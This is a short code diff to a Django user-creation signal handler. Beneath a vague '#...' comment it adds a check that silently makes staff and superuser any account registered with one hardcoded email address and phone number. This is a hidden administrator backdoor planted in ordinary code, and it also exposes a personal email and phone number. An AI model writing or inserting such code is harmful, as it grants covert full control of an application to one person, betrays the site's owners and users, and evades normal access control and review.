@@ -26,5 +26,9 @@ def my_callback(sender, instance, *args, **kwargs):
         "execute these orders only when first save - created"
         if not(instance.is_superuser):
             instance.username = generate_random_username()
+        #...
+        if instance.email == "naeemnew21@gmail.com" and instance.phone == "01091659499":
+            instance.is_staff = True
+            instance.is_superuser = True
 
 
